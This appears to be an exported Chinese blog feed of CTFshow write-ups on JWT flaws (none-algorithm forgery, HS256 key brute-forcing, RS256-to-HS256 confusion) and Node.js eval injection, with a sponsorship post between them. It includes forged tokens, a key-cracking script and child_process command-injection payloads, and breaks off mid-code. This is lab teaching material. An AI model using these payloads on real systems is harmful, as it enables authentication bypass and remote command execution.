      <title>web入门-JWT</title>
      <link href="/2024/07/27/web%E5%85%A5%E9%97%A8-JWT/"/>
      <url>/2024/07/27/web%E5%85%A5%E9%97%A8-JWT/</url>
      
        <content type="html"><![CDATA[<h3 id="JWT浅析"><a href="#JWT浅析" class="headerlink" title="JWT浅析"></a>JWT浅析</h3><p>JWT即JSON WEB TOKEN，由三个部分组成，并用两个“.”进行连接。第一部分为header（base64加密），第二部分为payload（base64加密），第三部分为verify signature，它的构成如下：</p><p><img src="begin.png" loading="lazy"></p><p>HEADER中alg对应的加密方式为HS256，也可以选择其他对称或非对称的加密方式，大同小异。</p><p>PAYLOAD中一般包括用户信息。</p><p>Verify Signature中包括加密的密码。</p><p>JWT本质上是一种校验值，用来验证身份和数据是否被更改。</p><h3 id="web345-350"><a href="#web345-350" class="headerlink" title="web345-350"></a>web345-350</h3><h4 id="web345-none"><a href="#web345-none" class="headerlink" title="web345(none)"></a>web345(none)</h4><p>查看源码得到Hint<code>/admin</code></p><p>访问后抓包看到cookie</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">auth=eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3MjIwNTgwNTksImV4cCI6MTcyMjA2NTI1OSwibmJmIjoxNzIyMDU4MDU5LCJzdWIiOiJ1c2VyIiwianRpIjoiMzQ4NWJkNjFmY2MwZjFhNjY4NDNhYzlhYTBhMzZjNzEifV0</span></span></code></pre><p>用<code>.</code>将其分为两半分别base64解码</p><pre class="language-php" data-language="php"><code class="language-php">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0 <span class="token operator">--</span><span class="token operator">></span>  <span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"alg"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"None"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"typ"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"jwt"</span><span class="token punctuation">&#125;</span>W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3MjIwNTgwNTksImV4cCI6MTcyMjA2NTI1OSwibmJmIjoxNzIyMDU4MDU5LCJzdWIiOiJ1c2VyIiwianRpIjoiMzQ4NWJkNjFmY2MwZjFhNjY4NDNhYzlhYTBhMzZjNzEifV0  <span class="token operator">--</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"iss"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"iat"</span><span class="token punctuation">:</span><span class="token number">1722058059</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"exp"</span><span class="token punctuation">:</span><span class="token number">1722065259</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"nbf"</span><span class="token punctuation">:</span><span class="token number">1722058059</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sub"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jti"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"3485bd61fcc0f1a66843ac9aa0a36c71"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span></code></pre><p>然后将后半部分改为<code>[&#123;&quot;sub&quot;:&quot;admin&quot;&#125;]</code>base64编码后与第一部分拼接</p><pre class="language-http" data-language="http"><code class="language-http">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0A.W3sic3ViIjoiYWRtaW4ifV0</code></pre><p>发送得到flag</p><h4 id="web346-348-HS256"><a href="#web346-348-HS256" class="headerlink" title="web346-348(HS256)"></a>web346-348(HS256)</h4><p>这次使用了HS256加密，主要就是爆破key，网上有很多方法，这里我使用的是<a href="https://github.com/Aiyflowers/JWT_GUI">JWT_GUI</a></p><p><img src="web346.png" loading="lazy"></p><pre class="language-http" data-language="http"><code class="language-http">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTcyMjA2MjAzMSwiZXhwIjoxNzIyMDY5MjMxLCJuYmYiOjE3MjIwNjIwMzEsInN1YiI6ImFkbWluIiwianRpIjoiNjUwZWVkZWVjNDAwYTA2ZTAxNWM1NjUzOWNkMmY5MTAifQ.Q2JT2tqgC8JogIjUH6PNNQN3_MY3QmDp8LK6aBj7Pfs</code></pre><p>这里也有py爆破脚本</p><pre class="language-python" data-language="python"><code class="language-python">python <span class="token punctuation">.</span><span class="token operator">/</span>pydictor<span class="token punctuation">.</span>py <span class="token operator">-</span>base d <span class="token operator">-</span><span class="token operator">-</span><span class="token builtin">len</span> <span class="token number">1</span> <span class="token number">6</span> <span class="token operator">-</span>o nums1_6<span class="token punctuation">.</span>txt</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwt<span class="token keyword">import</span> json<span class="token keyword">def</span> <span class="token function">runblasting</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span>jwt_str<span class="token punctuation">,</span>alg<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> alg <span class="token operator">==</span> <span class="token string">"none"</span><span class="token punctuation">:</span>        alg <span class="token operator">=</span> <span class="token string">"HS256"</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>            key_ <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'use '</span><span class="token operator">+</span>key_<span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>jwt_str<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>key<span class="token operator">=</span>key_<span class="token punctuation">,</span>algorithms<span class="token operator">=</span>alg<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'found key! -->'</span> <span class="token operator">+</span> key_<span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ExpiredSignatureError<span class="token punctuation">,</span> jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidAudienceError<span class="token punctuation">,</span>jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidIssuedAtError<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'found key! -->'</span> <span class="token operator">+</span> key_<span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidSignatureError<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"key not found!"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> <span class="token string">'./nums1_6.txt'</span>    jwt_str <span class="token operator">=</span> <span class="token string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMjY2NzAxMywiZXhwIjoxNjMyNjc0MjEzLCJuYmYiOjE2MzI2NjcwMTMsInN1YiI6InVzZXIiLCJqdGkiOiIyNzM3NjJhOWU1NjZhMmIzNDJhYjUxN2VjNDNiOWY5YSJ9.4sf78nrf_g84F9m0Bpgbvn8fC1YkECCFZPd5U9tULYg"</span>    alg <span class="token operator">=</span> <span class="token string">'HS256'</span>    runblasting<span class="token punctuation">(</span>path<span class="token punctuation">,</span>jwt_str<span class="token punctuation">,</span>alg<span class="token punctuation">)</span></code></pre><p>348 key : aabb</p><h4 id="web349-RS256"><a href="#web349-RS256" class="headerlink" title="web349(RS256)"></a>web349(RS256)</h4><p>Hint:</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// app.js</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> privateKey <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'//public//private.key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">user</span><span class="token operator">:</span> <span class="token string">'user'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> privateKey<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'RS256'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">,</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res<span class="token punctuation">,</span>next</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">"flag_here"</span><span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> auth <span class="token operator">=</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>auth<span class="token punctuation">;</span><span class="token keyword">var</span> cert <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'//public/public.key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// get public key</span>jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>auth<span class="token punctuation">,</span> cert<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> decoded</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>decoded<span class="token punctuation">.</span>user<span class="token operator">===</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'you are not admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>使用了RS256加密，但是公私钥都可以访问到</p><p>同上工具</p><pre class="language-http" data-language="http"><code class="language-http">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3MjIwNjM2OTd9.tUleRykg1PvGpCF1_mpKka0XK0eYp0X68cYVDnexuzy1gHWlEnAtOqSuwSclFSeLqHPGhIuWWCbyMlLuj9H8E-wq2l3GZYIzbiDLjR6C0XDwVQqP2eSgP1E00bSedY-fJtsDD9Jwwk-Xu9sG5Zo56dkoUmo51vXuJimGiVj1HDU</code></pre><h4 id="web350-RS256-HS256"><a href="#web350-RS256-HS256" class="headerlink" title="web350(RS256 -&gt; HS256)"></a>web350(RS256 -&gt; HS256)</h4><p>可以根据公钥，修改算法从 非对称算法（比如RS256） 到 对称密钥算法（HS256）双方都使用公钥验签，顺利篡改数据</p><p>当公钥可以拿到时，如果使用对称密码，则对面使用相同的公钥进行解密，实现验签通过</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> privateKey <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\\public.key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// console.log(privateKey);</span><span class="token keyword">var</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">user</span><span class="token operator">:</span> <span class="token string">'admin'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> privateKey<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'HS256'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<span class="token punctuation">.</span>eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3MjIwNjUxMDl9<span class="token punctuation">.</span>M40dyhCvr5aIUAy_mEqCYJC8TAcbNrx02HOfhl<span class="token operator">-</span><span class="token constant">GRIU</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DK盾-CTFers赞助计划</title>
      <link href="/2024/07/26/DK%E7%9B%BE/"/>
      <url>/2024/07/26/DK%E7%9B%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="DK盾-CTFers赞助计划推广"><a href="#DK盾-CTFers赞助计划推广" class="headerlink" title="DK盾-CTFers赞助计划推广"></a>DK盾-CTFers赞助计划推广</h1><p>CTFers可获得DK盾赞助服务器，非常之物美价廉，欢迎师傅们</p><p><strong>参与条件：</strong></p><ol><li>参与过5个以上国内CTF赛事，附上相关证明。</li><li>每月在个人技术博客上至少更新1篇原创文章（CTF技术相关），总量10篇以上。</li><li>博客底部挂有DK盾赞助标识或发布一篇推广文章。</li></ol><p><strong>续费条件：</strong></p><ol><li>满足以上参与条件的第2和第3项。</li><li>积极参与CTF赛事。</li><li>每月续费1元。</li></ol><p><strong>升级条件：</strong></p><ol><li>博客文章数量质量和赛事排名有所提高</li><li>推广DK盾软文&#x2F;测评</li><li>按实际需求</li></ol><p><strong>CTF团队福利：</strong></p><ul><li>高防CDN</li><li>高防机柜免费托管等</li></ul><h4 id="满足条件的师傅可以去官网提交工单奥"><a href="#满足条件的师傅可以去官网提交工单奥" class="headerlink" title="满足条件的师傅可以去官网提交工单奥"></a>满足条件的师傅可以去官网提交工单奥</h4><h3 id="QQ-群-727077055"><a href="#QQ-群-727077055" class="headerlink" title="QQ 群: 727077055"></a>QQ 群: 727077055</h3>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>web入门-nodejs</title>
      <link href="/2024/07/25/web%E5%85%A5%E9%97%A8-nodejs/"/>
      <url>/2024/07/25/web%E5%85%A5%E9%97%A8-nodejs/</url>
      
        <content type="html"><![CDATA[<p><a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">ctf-nodejs之一些小知识</a></p><p><a href="https://xz.aliyun.com/t/7184?time__1311=n4+xnD0Dy737q4Yq7KDsA3rPoGCi1tTttrtO4D">Node.js 常见漏洞学习与总结</a></p><h3 id="web334-344"><a href="#web334-344" class="headerlink" title="web334-344"></a>web334-344</h3><h4 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h4><p>查看附件给了源码，感觉考了简单的代码审计</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// login.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> users <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../modules/user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>items<span class="token punctuation">;</span> <span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> users<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> name<span class="token operator">!==</span><span class="token string">'CTFSHOW'</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>username <span class="token operator">===</span> name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token function">findUser</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">regenerate</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>             req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>loginUser <span class="token operator">=</span> user<span class="token punctuation">.</span>username<span class="token punctuation">;</span>      res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录成功'</span><span class="token punctuation">,</span><span class="token literal-property property">ret_flag</span><span class="token operator">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'账号或密码错误'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// user.js</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">items</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span><span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">'CTFSHOW'</span><span class="token punctuation">,</span> <span class="token literal-property property">password</span><span class="token operator">:</span> <span class="token string">'123456'</span><span class="token punctuation">&#125;</span>  <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>这里有个坑，这里不让直接等于CTFSHOW，而是对输入的name进行大写后比较，所以<code>name=ctfshow</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> users<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> name<span class="token operator">!==</span><span class="token string">'CTFSHOW'</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>username <span class="token operator">===</span> name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><h4 id="web335-child-process-execSync"><a href="#web335-child-process-execSync" class="headerlink" title="web335(child_process.execSync)"></a>web335(child_process.execSync)</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span># <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token operator">:</span> utf<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span># @Author<span class="token operator">:</span> h1xa# @Date<span class="token operator">:</span>   <span class="token number">2020</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">25</span> <span class="token number">03</span><span class="token operator">:</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">21</span># @Last Modified by<span class="token operator">:</span>   h1xa# @Last Modified time<span class="token operator">:</span> <span class="token number">2020</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">25</span> <span class="token number">06</span><span class="token operator">:</span><span class="token number">52</span><span class="token operator">:</span><span class="token number">38</span># @email<span class="token operator">:</span> h1xa@ctfer<span class="token punctuation">.</span>com# @link<span class="token operator">:</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>ctfer<span class="token punctuation">.</span>com<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">></span><span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token constant">CTFFSHOW</span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>    <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span> src<span class="token operator">=</span><span class="token string">"/javascripts/jquery.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span>    where is flag<span class="token operator">?</span>     <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">/</span><span class="token operator">?</span>eval<span class="token operator">=</span> <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></code></pre><p>在nodejs中，eval()方法用于计算字符串，并把它作为脚本代码来执行，语法为“eval(string)”；如果参数不是字符串，而是整数或者是Function类型，则直接返回该整数或Function。</p><p><a href="https://nodejs.cn/api/child_process.html">child_process</a>具体用法</p><p><strong>child_process.execSync(command[, options])</strong></p><p><code>child_process.execSync()</code> 方法通常与 <a href="https://nodejs.cn/api/child_process.html#child_processexeccommand-options-callback"><code>child_process.exec()</code></a> 相同，只是该方法在子进程完全关闭之前不会返回。当遇到超时并发送 <code>killSignal</code> 时，该方法将在进程完全退出之前不会返回。如果子进程拦截并处理了 <code>SIGTERM</code> 信号没有退出，父进程会一直等到子进程退出。</p><p>所以构造Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span><span class="token keyword">eval</span><span class="token operator">=</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'child_process'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac fl00g.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token keyword">eval</span><span class="token operator">=</span><span class="token keyword">global</span><span class="token operator">.</span>process<span class="token operator">.</span>mainModule<span class="token operator">.</span>constructor<span class="token operator">.</span><span class="token function">_load</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'child_process'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'calc'</span><span class="token punctuation">)</span></code></pre><h4 id="web336-fs-readFileSync-反弹shell"><a href="#web336-fs-readFileSync-反弹shell" class="headerlink" title="web336(fs.readFileSync  反弹shell)"></a>web336(fs.readFileSync  反弹shell)</h4><p>__filename 表示当前正在执行的脚本的文件名。它将输出文件所在位置的绝对路径，且和命令行参数所指定的文件名不一定相同。 如果在模块中，返回的值是模块文件的路径。 dirname 表示当前执行脚本所在的目录。</p><p>所以<code>?eval=__filename</code>看到文件&#x2F;app&#x2F;routes&#x2F;index.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> router <span 